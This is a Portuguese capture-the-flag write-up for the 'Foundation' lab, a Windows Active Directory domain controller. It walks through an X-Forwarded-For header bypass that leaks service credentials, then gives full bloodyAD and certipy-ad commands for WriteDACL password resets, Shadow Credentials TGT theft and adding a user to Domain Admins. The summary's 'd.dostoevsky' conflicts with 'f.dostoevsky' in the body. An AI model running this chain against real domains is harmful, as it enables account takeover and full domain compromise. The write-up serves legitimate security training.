# Foundation

![Foundation](/images/hackingclub-foundation/file-foundation-2026-1.png)

# Sumário

A exploração teve início com a identificação de um endpoint restrito a requisições internas. Foi possível contornar essa limitação por meio de um bypass utilizando o header `X-Forwarded-For` configurado como `127.0.0.1`, fazendo com que a aplicação tratasse a requisição como proveniente do próprio servidor.

Com esse acesso indevido, foi possível obter credenciais do `Active Directory (AD)` associadas ao usuário `c.jung`. A partir dessas credenciais, foi realizada uma enumeração de permissões no AD, identificando que o usuário possuía a permissão `WriteDACL` sobre o usuário `c.lispector`, permitindo a modificação de suas permissões e, consequentemente, a redefinição de sua senha.

Após assumir o controle da conta c.lispector, verificou-se que este usuário possuía a permissão `AddKeyCredentialLink` sobre o usuário `f.dostoevsky`. Essa permissão possibilitou a adição de uma credencial baseada em certificado `(ataque conhecido como Shadow Credentials)`, permitindo a obtenção de um certificado válido para autenticação como d.dostoevsky.

Utilizando o certificado obtido, foi possível solicitar e extrair o `Ticket Granting Ticket (TGT)` desse usuário, garantindo autenticação completa no domínio.

Por fim, o usuário d.dostoevsky possuía permissão `AddMember` em um grupo privilegiado, o que permitiu sua adição ao grupo de administradores do domínio, resultando na elevação completa de privilégios e comprometimento total do ambiente.

## Scan da rede

Utilizando a ferramenta nmap, foi possível obter as informações de portas abertas no host.

**Resultado**

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Foundation -- Infrastructure Dashboard
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-09 15:26:51Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: foundation.hc0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.foundation.hc
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.foundation.hc
| Not valid before: 2026-04-02T17:01:03
|_Not valid after:  2027-04-02T17:01:03
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: foundation.hc0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.foundation.hc
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.foundation.hc
| Not valid before: 2026-04-02T17:01:03
|_Not valid after:  2027-04-02T17:01:03
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-04-09T15:27:50+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC01.foundation.hc
| Not valid before: 2026-04-01T00:57:24
|_Not valid after:  2026-10-01T00:57:24
| rdp-ntlm-info: 
|   Target_Name: FOUNDATION
|   NetBIOS_Domain_Name: FOUNDATION
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: foundation.hc
|   DNS_Computer_Name: DC01.foundation.hc
|   Product_Version: 10.0.20348
|_  System_Time: 2026-04-09T15:27:09+00:00
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

> ⚠️ Após a varredura com o Nmap, identificou-se um serviço web na porta 80, que foi escolhido como ponto inicial de exploração.
{: .prompt-warning}

## Fuzzing

Após acessar a porta 80, foi identificado um painel de login. Como não havia credenciais disponíveis, partiu-se para a enumeração de diretórios e arquivos expostos. Por se tratar de uma aplicação `ASP.NET`, foi realizado um fuzzing com o feroxbuster em busca de endpoints com extensão `.aspx`.

![Feroxbuster](/images/hackingclub-foundation/file-foundation-2026-3.png)
![Dashboard](/images/hackingclub-foundation/file-foundation-2026-4.png)
![Endpoint](/images/hackingclub-foundation/file-foundation-2026-5.png)

**Resultado**

- Arquivo : `dashboard.aspx`
- Endpoint : `/api/v2/diagnostics/boot_strap`

##  Bypass no endpoint vulnerável

Após analisar o endpoint vulnerável, foi possível identificar um bloqueio de acesso retornando `HTTP 403 Forbidden` quando acessado diretamente. Esse comportamento indica uma possível restrição baseada na origem da requisição.

Para contornar essa limitação, foi utilizada a técnica de `IP Spoofing via header HTTP (X-Forwarded-For Header Injection)`. Essa abordagem explora aplicações que confiam indevidamente no header `X-Forwarded-For` para validar se a requisição é interna.

Com o uso do Burp Suite, a requisição foi interceptada e reenviada pelo Repeater, adicionando o header `X-Forwarded-For: 127.0.0.1`. Dessa forma, a aplicação passou a interpretar a requisição como proveniente do próprio servidor (localhost), permitindo o bypass da restrição e acesso ao endpoint protegido.

![Bypass](/images/hackingclub-foundation/file-foundation-2026-6.png)

**Resultado**

```
{
  "status": "healthy",
  "timestamp": "2026-04-09T15:34:46Z",
  "build": "foundation-platform-4.2.1+20260331.dc01",
  "host": "DC01",
  "environment": "production",
  "debug_mode": true,

  "services": {
    "ad_sync":       { "status": "ok",       "latency_ms": 12  },
    "deploy_runner": { "status": "ok",       "latency_ms": 8   },
    "log_collector": { "status": "ok",       "latency_ms": 23  },
    "auth_service":  { "status": "degraded", "latency_ms": 440,
                       "note": "AuthService v2 migration pending -- v1 fallback active (FND-2041)" }
  },

  "_debug": {
    "warning": "debug block active -- disable before next release (web.config: compilation debug=true)",
    "auth_bootstrap": {
      "endpoint" : "/api/v2/diagnostics/boot_strap",
      "method"   : "GET",
      "domain"   : "foundation.hc",
      "svc_user" : "c.jung",
      "svc_pass" : "Str0ng#J4ng2026!@763",
      "purpose"  : "AD read-only sync account -- AuthGuard session rebuild",
      "jira_ref" : "FND-2041 -- migrate to mTLS vault injection Q2-2026"
    },
    "internal_endpoints": [
      { "method": "POST", "path": "/api/v2/internal/auth-bootstrap",  "auth": "svc_account", "note": "session token issuance" },
      { "method": "GET",  "path": "/api/v2/diagnostics/boot_strap",   "auth": "loopback",    "note": "this endpoint" },
      { "method": "GET",  "path": "/api/v2/diagnostics/trace",        "auth": "loopback",    "note": "request trace viewer" },
      { "method": "POST", "path": "/api/v2/internal/node-heartbeat",  "auth": "svc_account", "note": "node keepalive" },
      { "method": "POST", "path": "/api/v2/internal/deploy-trigger",  "auth": "svc_account", "note": "deployment pipeline trigger" },
      { "method": "GET",  "path": "/trace.axd",                       "auth": "none",        "note": "ASP.NET built-in trace handler" },
      { "method": "GET",  "path": "/elmah.axd",                       "auth": "none",        "note": "ELMAH error log viewer" }
    ]
  }
}
```

Com as credenciais obtidas, foi possível acessar o host utilizando a ferramenta `evil-winrm`, estabelecendo uma sessão remota via WinRM e permitindo a obtenção da primeira flag.

![C.jung](/images/hackingclub-foundation/file-foundation-2026-7.png)

> ℹ️ Sucesso : Temos acesso a shell como c.jung!
{: .prompt-info}

## Usuários do AD

Com acesso ao host, podemos enumerar os usuários existentes.

![Users](/images/hackingclub-foundation/file-foundation-2026-10.png)

- Users : `c.lispector` - `f.dostoevsky` - `Administrator`

## Abuso de ACL - GenericAll e Reset Password

### Análise do BloodHound

Em seguida, foi realizada a análise das permissões no AD utilizando o BloodHound. Observou-se que o usuário c.jung possuía permissão `WriteDACL` sobre `c.lispector`, o que possibilitou a modificação de suas permissões e a redefinição de sua senha, garantindo acesso à conta.

![WriteDacl](/images/hackingclub-foundation/file-foundation-2026-9.png)

Podemos dar permissão de GenericAll sobre a c.lispector e alterar a senha utilizando o bloodyAD:

```bash
bloodyAD -u c.jung -p 'Str0ng#J4ng2026!@763' -d foundation.hc -H dc01.foundation.hc add genericAll c.lispector c.jung
```

```bash
bloodyAD -u c.jung -p 'Str0ng#J4ng2026!@763' -d foundation.hc -H dc01.foundation.hc set password c.lispector 'Pwned123!'
```

![c.lispector](/images/hackingclub-foundation/file-foundation-2026-11.png)

> ℹ️ Sucesso : Senha alterada com êxito!
{: .prompt-info}

## Shadow Credentials

### Análise do BloodHound

Retornamos ao BloodHound para analisar as permissões do usuário c.lispector sobre outros objetos no AD. Foi identificado que ela possuía a permissão `AddKeyCredentialLink` sobre o `f.dostoevsky`.
Explorando essa permissão (técnica de Shadow Credentials), foi possível adicionar uma nova credencial ao atributo msDS-KeyCredentialLink. Em seguida, utilizando a ferramenta Certipy, o certificado foi extraído e utilizado para obter o `TGT` do usuário alvo via PKINIT, permitindo a autenticação como esse usuário sem a necessidade da senha.

![AddKeyCredentialLink](/images/hackingclub-foundation/file-foundation-2026-12.png)

Utilizamos o certipy-ad para adicionando uma credencial controlada ao atributo msDS-KeyCredentialLink do usuário alvo:

```bash
certipy-ad shadow add -u c.lispector@foundation.hc -p 'Pwned123!' -account f.dostoevsky -dc-ip 172.16.8.210 -dc-host dc01.foundation.hc
```

![certipy-ad](/images/hackingclub-foundation/file-foundation-2026-13.png)

Em seguida, obtemos o TGT do usuário:

```bash
certipy-ad auth -pfx f.dostoevsky.pfx -username f.dostoevsky -domain foundation.hc -dc-ip 172.16.8.210
```

![TGT](/images/hackingclub-foundation/file-foundation-2026-14.png)

> ℹ️ Sucesso : Nos autenticamos com o usuário f.dostoevsky!
{: .prompt-info}

## Group Membership Abuse

### Análise do BloodHound

O usuário f.dostoevsky, conforme análise no BloodHound, possuía a permissão `AddMember` sobre diversos grupos privilegiados, incluindo o grupo `Domain Admins`.

![AddMember](/images/hackingclub-foundation/file-foundation-2026-15.png)
![MemberOff](/images/hackingclub-foundation/file-foundation-2026-21.png)

Dessa forma, foi possível adicioná-lo a esse grupo e herdar automaticamente seus privilégios, obtendo acesso administrativo ao domínio. A partir disso, também seria viável realizar ataques adicionais, como alteração da senha de contas administrativas ou autenticação direta como membros do grupo privilegiado.

1 - Adicionar ao grupo e alterar a senha do administrador:

```bash
bloodyAD -d foundation.hc -u f.dostoevsky -p :$TGT -H dc01.foundation.hc add groupMember "Domain Admins" f.dostoevsky
```

```bash
bloodyAD -d foundation.hc -u f.dostoevsky -p :$TGT -H dc01.foundation.hc set password Administrator "PwnedAdm123!"
```

![Administrator](/images/hackingclub-foundation/file-foundation-2026-20.png)

A alteração da senha pode ser feita direto na shell sem precisar usar a ferramenta bloodyAD :

```bash
net group "Domain Admins" f.dostoevsky /add /domain
```

![Domain Admin](/images/hackingclub-foundation/file-foundation-2026-16.png)

```bash
net user Administrator PwnedAdm123! /domain
```
![Domain Admin](/images/hackingclub-foundation/file-foundation-2026-18.png)
![Domain Admin](/images/hackingclub-foundation/file-foundation-2026-19.png)

> ℹ️ Sucesso : Somos usuário Administrador do AD.
{: .prompt-info}

2 - Herdar as permissões de administrador somente adicionando ao grupo:

![Administrator](/images/hackingclub-foundation/file-foundation-2026-16.png)
![Administrator](/images/hackingclub-foundation/file-foundation-2026-17.png)

> ⚠️  Lembre-se que após se adicionar o grupo de Domain Admins, a shell deve ser encerrada e iniciada novamente para que as permissões funcione. Isso ocorre porque as permissões são carregadas em um access token no momento do login, e não são atualizadas dinamicamente durante a sessão. .
{: .prompt-warning}